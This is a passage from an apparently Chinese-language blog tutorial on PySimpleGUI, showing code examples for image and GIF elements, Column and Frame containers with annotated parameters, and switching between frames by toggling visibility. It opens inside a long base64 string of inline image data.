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&#x27;</span></span><br><span class="line">base64_gif=sg.DEFAULT_BASE64_LOADING_GIF</span><br><span class="line">layout=[</span><br><span class="line">    <span class="comment"># [sg.Image(filename=img)]</span></span><br><span class="line">    [sg.Image(data=base64_gif,key=<span class="string">&#x27;-GIF-&#x27;</span>)]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">window=sg.Window(<span class="string">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event,values=window.read(timeout=<span class="number">10</span>)</span><br><span class="line">    window[<span class="string">&#x27;-GIF-&#x27;</span>].update_animation(source=base64_gif,time_between_frames=<span class="number">100</span>)</span><br><span class="line">    <span class="keyword">if</span> event==<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="28列元素的书写及设定方式-py"><a href="#28列元素的书写及设定方式-py" class="headerlink" title="28列元素的书写及设定方式.py"></a>28列元素的书写及设定方式.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">书写方法：</span></span><br><span class="line"><span class="string">sg.Column() or sg.Col()</span></span><br><span class="line"><span class="string">一个容器元素，用于在窗口的布局中创建布局</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line"></span><br><span class="line">layoutL=[</span><br><span class="line">    [sg.T(<span class="string">&#x27;标题&#x27;</span>)],</span><br><span class="line">    [sg.In(<span class="string">&#x27;请输入文章标题&#x27;</span>)],</span><br><span class="line">    [sg.T(<span class="string">&#x27;作者&#x27;</span>)],</span><br><span class="line">    [sg.In(<span class="string">&#x27;请输入姓名或笔名&#x27;</span>)]</span><br><span class="line">]</span><br><span class="line">layoutR=[</span><br><span class="line">    [sg.ML(<span class="string">&#x27;请输入正文内容&#x27;</span>,size=(<span class="number">30</span>,<span class="number">20</span>))],</span><br><span class="line">    [sg.B(<span class="string">&#x27;确认提交&#x27;</span>)]</span><br><span class="line">]</span><br><span class="line">layout=[</span><br><span class="line">    [sg.Col(layoutL,</span><br><span class="line">            background_color=<span class="string">&#x27;black&#x27;</span>,  <span class="comment"># 整栏背景色</span></span><br><span class="line">            <span class="comment"># size=None, # 宽度和高度设定(pix),偶尔不工作</span></span><br><span class="line">            pad=<span class="literal">None</span>, <span class="comment"># 和周围元素间的间隔（（左右）（上下））</span></span><br><span class="line">            scrollable=<span class="literal">None</span>, <span class="comment"># 如果为True，则滚动条将添加到该列</span></span><br><span class="line">            vertical_scroll_only=<span class="literal">None</span>, <span class="comment"># 如果为True,则不会显示水平滚动条</span></span><br><span class="line">            right_click_menu=<span class="literal">None</span>, <span class="comment"># 右击调出菜单</span></span><br><span class="line">            key=<span class="literal">None</span>, <span class="comment"># 元素的唯一标识符</span></span><br><span class="line">            visible=<span class="literal">True</span>,   <span class="comment"># 元素可见状态设定</span></span><br><span class="line">            justification=<span class="string">&quot;left&quot;</span>, <span class="comment"># 为列本身设置对齐方式</span></span><br><span class="line">            element_justification=<span class="string">&quot;center&quot;</span>, <span class="comment"># 列内所有元素的对齐方式，有效值为left,center,right</span></span><br><span class="line">            vertical_alignment=<span class="string">&#x27;top&#x27;</span>, <span class="comment"># 垂直对齐方式，有效值为top, bottom, center</span></span><br><span class="line">            grab=<span class="literal">True</span>, <span class="comment"># 如果设定为True，可以拖拽此元素移动窗口</span></span><br><span class="line">            expand_x=<span class="literal">None</span>, <span class="comment"># 如果为True，则列将自动沿X方向扩展以填充可用空间</span></span><br><span class="line">            expand_y=<span class="literal">True</span>, <span class="comment"># 如果为True，则列将自动沿y方向扩展以填充可用空间</span></span><br><span class="line"></span><br><span class="line">            ),sg.Col(layoutR)]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">window=sg.Window(<span class="string">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event,values=window.read()</span><br><span class="line">    <span class="keyword">if</span> event==<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="29框架元素的书写及设定方法-py"><a href="#29框架元素的书写及设定方法-py" class="headerlink" title="29框架元素的书写及设定方法.py"></a>29框架元素的书写及设定方法.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line"></span><br><span class="line">layouta=[</span><br><span class="line">    [sg.T(<span class="string">&#x27;账号&#x27;</span>),sg.In()],</span><br><span class="line">    [sg.T(<span class="string">&#x27;密码&#x27;</span>),sg.In()]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">layout=[</span><br><span class="line">	[sg.Frame(title=<span class="string">&#x27;登录框&#x27;</span>,layout=layouta,</span><br><span class="line">            title_color=<span class="literal">None</span>, <span class="comment"># 标题文本颜色设定</span></span><br><span class="line">            background_color=<span class="string">&#x27;black&#x27;</span>,  <span class="comment"># 框架背景色</span></span><br><span class="line">            title_location=<span class="literal">None</span>, <span class="comment"># 标题所处位置，有效值有12种（ewsn东南西北），n,nw,ne,e,en,es,s,se,sw,w,ws,wn,nw(default)</span></span><br><span class="line">            relief=<span class="literal">None</span>,  <span class="comment"># 浮雕设计&#x27;raised&#x27;, &#x27;sunken&#x27;, &#x27;flat&#x27;, &#x27;ridge&#x27;, &#x27;solid&#x27;, &#x27;groove&#x27;,</span></span><br><span class="line">            size=(<span class="literal">None</span>,<span class="literal">None</span>), <span class="comment"># 宽度和高度设定(pix),偶尔不工作</span></span><br><span class="line">            pad=<span class="literal">None</span>, <span class="comment"># 和周围元素间的间隔（（左右）（上下））</span></span><br><span class="line">            font=<span class="literal">None</span>, <span class="comment"># 可以设置字体名称，大小等。</span></span><br><span class="line">            border_width=<span class="number">10</span>, <span class="comment"># 框架元素的线条宽度</span></span><br><span class="line">            tooltip=<span class="literal">None</span>, <span class="comment"># 悬浮文本</span></span><br><span class="line">            right_click_menu=<span class="literal">None</span>, <span class="comment"># 右击调出菜单</span></span><br><span class="line">            key=<span class="literal">None</span>, <span class="comment"># 元素的唯一标识符</span></span><br><span class="line">            visible=<span class="literal">True</span>,   <span class="comment"># 元素可见状态设定</span></span><br><span class="line">            element_justification=<span class="string">&quot;center&quot;</span>, <span class="comment"># 列内所有元素的对齐方式，有效值为left,center,right</span></span><br><span class="line">            vertical_alignment=<span class="string">&#x27;top&#x27;</span>, <span class="comment"># 垂直对齐方式，有效值为top, bottom, center</span></span><br><span class="line">              )]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">window=sg.Window(<span class="string">&#x27;Python GUI&#x27;</span>, layout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event,values=window.read(timeout=<span class="number">10</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> event==<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="30通过框架元素更新实现界面切换-py"><a href="#30通过框架元素更新实现界面切换-py" class="headerlink" title="30通过框架元素更新实现界面切换.py"></a>30通过框架元素更新实现界面切换.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">书写方法：</span></span><br><span class="line"><span class="string">window[key].Update(visible=None)</span></span><br><span class="line"><span class="string">可更新的属性：</span></span><br><span class="line"><span class="string">value=None, # 框架元素的标题</span></span><br><span class="line"><span class="string">visible=None, # 元素的可见状态</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line"><span class="built_in">list</span>=[<span class="string">&#x27;资料1&#x27;</span>,<span class="string">&#x27;资料2&#x27;</span>,<span class="string">&#x27;资料3&#x27;</span>,<span class="string">&#x27;资料4&#x27;</span>]</span><br><span class="line">layouta = [</span><br><span class="line">    [sg.T(<span class="string">&#x27;账号&#x27;</span>), sg.In()],</span><br><span class="line">    [sg.T(<span class="string">&#x27;密码&#x27;</span>), sg.In()],</span><br><span class="line">    [sg.B(<span class="string">&#x27;确定&#x27;</span>),sg.B(<span class="string">&#x27;取消&#x27;</span>)]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">layoutb=[</span><br><span class="line">    [sg.LB(<span class="built_in">list</span>,size=(<span class="number">30</span>,<span class="number">5</span>))]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">layout = [</span><br><span class="line">    [sg.Frame(title=<span class="string">&#x27;登录框&#x27;</span>, layout=layouta,key=<span class="string">&#x27;-a-&#x27;</span>),</span><br><span class="line">     sg.Frame(title=<span class="string">&#x27;资料列表&#x27;</span>,layout=layoutb,visible=<span class="literal">False</span>,key=<span class="string">&#x27;-b-&#x27;</span>)]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">window = sg.Window(<span class="string">&#x27;Python GUI&#x27;</span>, 